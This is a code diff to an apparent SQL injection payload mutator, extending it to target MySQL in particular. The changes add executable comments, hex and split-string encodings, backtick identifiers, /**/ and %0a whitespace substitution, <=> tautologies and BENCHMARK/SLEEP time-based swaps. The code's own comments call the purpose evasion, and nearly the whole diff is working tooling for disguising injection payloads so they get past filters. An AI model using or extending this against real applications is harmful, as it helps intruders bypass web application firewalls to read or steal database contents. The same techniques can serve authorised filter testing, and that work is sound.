@@ -215,17 +215,22 @@ class ASTMutator:
         return payload + chosen_term
 
     def _tokenize(self, payload):
-        """A simple lexical analyzer that breaks SQL down into semantic tokens."""
+        """A lexical analyzer exclusively designed for MySQL's dialect and idiosyncrasies."""
         token_specification = [
-            ('STRING',     r"'[^']*'|\"[^\"]*\""),
-            ('COMMENT',    r"/\*.*?\*/|--[^\n]*"),
-            ('KEYWORD',    r"\b(SELECT|UNION|OR|AND|XOR|WHERE|FROM|DATABASE|USER|VERSION|ORDER\s+BY|GROUP\s+BY)\b"),
-            ('NUMBER',     r"\b\d+\b"),
-            ('OPERATOR',   r"<=|>=|!=|=|\+|-|\*|/|%|\|\||&&"),
-            ('IDENTIFIER', r"\b[a-zA-Z_][a-zA-Z0-9_]*\b"),
-            ('SYMBOL',     r"[(),;.]"),
-            ('WHITESPACE', r"[ \t\n]+"),
-            ('MISC',       r"."),
+            ('EXEC_COMMENT', r"/\*![0-9]{5}.*?\*/"),       # Executable comment (MySQL specific)
+            ('COMMENT',      r"/\*.*?\*/|--\s[^\n]*|#[^\n]*"), # Standard/MySQL comments (Note: -- needs space after)
+            ('HEX_BIT',      r"0[xX][0-9a-fA-F]+|0[bB][01]+|[xX]'[0-9a-fA-F]+'|[bB]'[01]+'"), # Hex/Bit literals
+            ('STRING',       r"'[^']*'|\"[^\"]*\""),       # MySQL allows both single and double quotes
+            ('SYS_VAR',      r"@@[a-zA-Z_0-9]+"),          # System variables
+            ('VAR',          r"@[a-zA-Z_0-9]+"),           # User variables
+            ('KEYWORD',      r"\b(SELECT|UNION|ALL|OR|AND|XOR|WHERE|FROM|DATABASE|USER|VERSION|ORDER\s+BY|GROUP\s+BY|LIMIT|OFFSET|HAVING|SLEEP|BENCHMARK|CONNECTION_ID|LOAD_FILE|INTO\s+OUTFILE|DUMPFILE)\b"),
+            ('NUMBER',       r"\b\d+(\.\d+)?([eE][+-]?\d+)?\b"), # MySQL numbers (integers, floats, scientific)
+            ('OPERATOR',     r"<=>|:=|<=|>=|!=|<>|=|\+|-|\*|/|%|\|\||&&|<<|>>|&|\||\^|~|SOUNDS\s+LIKE|\bLIKE\b|\bIN\b|\bIS\b"),
+            ('BACKTICK_ID',  r"`[^`]*`"),                  # MySQL identifiers surrounded by backticks
+            ('IDENTIFIER',   r"\b[a-zA-Z_][a-zA-Z0-9_$]*\b"),
+            ('SYMBOL',       r"[(),;.]"),
+            ('WHITESPACE',   r"[ \t\n\r]+"),
+            ('MISC',         r"."),
         ]
         tok_regex = '|'.join('(?P<%s>%s)' % pair for pair in token_specification)
         get_token = re.compile(tok_regex, re.IGNORECASE).match
@@ -277,18 +282,20 @@ class ASTMutator:
         """Walks the AST and applies Grammar-Safe mutations based on the Semantic Dictionary."""
         result = ""
         
-        # 2. Semantic Dictionary
+        # 2. Semantic Dictionary using MySQL Specific Dialect
         semantic_dict = {
             "OPERATORS": {
-                "=": [" LIKE ", " IN ", " = "],
+                "=": [" LIKE ", " IN ", " = ", "<=>"], # <=> is MySQL's null-safe equal mapping
                 ">": [" >= ", " > "],
                 "||": [" OR ", " || "],
-                "&&": [" AND ", " && "]
+                "&&": [" AND ", " && "],
+                "!=": [" <> ", " != "]
             },
             "LOGICAL_FUNCTIONS": {
-                "SLEEP": ["BENCHMARK", "SLEEP"],
-                "DATABASE": ["SCHEMA", "DATABASE"],
-                "VERSION": ["@@VERSION", "VERSION()"]
+                "SLEEP": ["BENCHMARK(1000000,MD5(1))", "SLEEP"],
+                "DATABASE": ["SCHEMA", "DATABASE()", "DATABASE"],
+                "VERSION": ["@@VERSION", "VERSION()", "@@GLOBAL.version"],
+                "USER": ["SYSTEM_USER()", "SESSION_USER()", "CURRENT_USER()", "USER()"]
             }
         }
 
@@ -311,21 +318,39 @@ class ASTMutator:
                 upper_val = val.upper()
                 if upper_val in semantic_dict["LOGICAL_FUNCTIONS"] and random.random() < 0.4:
                     val = random.choice(semantic_dict["LOGICAL_FUNCTIONS"][upper_val])
-                elif random.random() < 0.4:
-                    # Obfuscate keyword
-                    val = f"/*!{random.randint(40000, 60000)}{val}*/"
+                elif random.random() < 0.6:
+                    # Specific MySQL feature: Executable Comments
+                    # These execute their contents in MySQL uniquely
+                    ver = random.choice(["10000", "50000", "50100", "50500", "50700", "00000"])
+                    val = f"/*!{ver}{val}*/"
                     
             elif t_type == 'STRING':
-                # String splitting / concatenation Evasion (e.g., 'admin' -> 'adm' 'in')
-                if len(val) > 4 and random.random() < 0.3:
+                # MySQL String tricks
+                coin = random.random()
+                if coin < 0.2:
+                    # Hex conversion trick for purely string literals (like 'admin' -> 0x61646d696e)
+                    inside = val[1:-1]
+                    if re.match(r"^[a-zA-Z0-9_]+$", inside): # Only for simple strings
+                        val = "0x" + "".join([f"{ord(c):02x}" for c in inside])
+                elif coin < 0.4 and len(val) > 4:
+                    # Concatenation Evasion without CONCAT: 'adm' 'in' is valid MySQL
                     quote_char = val[0]
                     inside = val[1:-1]
                     mid = len(inside) // 2
                     val = f"{quote_char}{inside[:mid]}{quote_char} {quote_char}{inside[mid:]}{quote_char}"
+                    
+            elif t_type == 'IDENTIFIER':
+                # MySQL Identifier masking using `backticks`
+                if not val.startswith("`") and random.random() < 0.4:
+                    val = f"`{val}`"
 
             elif t_type == 'WHITESPACE':
-                if random.random() < 0.2:
+                # Replaced spaces with arbitrary internal comments
+                coin = random.random()
+                if coin < 0.2:
                     val = "/**/"
+                elif coin < 0.3:
+                    val = "%0a"  # MySQL treats newlines implicitly as spaces in URL contexts
                     
             return val
         
@@ -347,13 +372,13 @@ class ASTMutator:
 
     def _logical_equivalents(self, payload):
         equivalents = {
-            r"1=1": ["true", "not false", "~1=~1", "8=8", "0x31=0x31", "(SELECT 1)=1"],
-            r"1=2": ["false", "not true", "1=0", "0=1", "(SELECT 1)=0"],
-            r"\bOR\b": ["||", "XOR", "OR 1=1", "OR true"],
-            r"\bAND\b": ["&&", "AND 1=1"],
-            r"\bXOR\b": ["OR", "||", "XOR true", "XOR 1=1"],
-            r"\btrue\b": ["1=1", "not 0", "XOR false", "(SELECT 1)"],
-            r"\bfalse\b": ["1=2", "0", "NULL", "(SELECT 0)"]
+            r"1=1": ["true", "not false", "~0", "0<=>0", "1<=>1", "0x31<=>0x31", "(SELECT 1)<=>1", "8=8"],
+            r"1=2": ["false", "not true", "1<=>0", "0<=>1", "(SELECT 1)<=>0"],
+            r"\bOR\b": ["||", "XOR", "OR 1<=>1", "OR true"],
+            r"\bAND\b": ["&&", "AND 1<=>1"],
+            r"\bXOR\b": ["OR", "||", "XOR true", "XOR 1<=>1"],
+            r"\btrue\b": ["1<=>1", "not 0", "XOR false", "(SELECT 1)"],
+            r"\bfalse\b": ["1<=>2", "0", "NULL", "(SELECT 0)"]
         }
         mutated = payload
         for pattern, alts in equivalents.items():
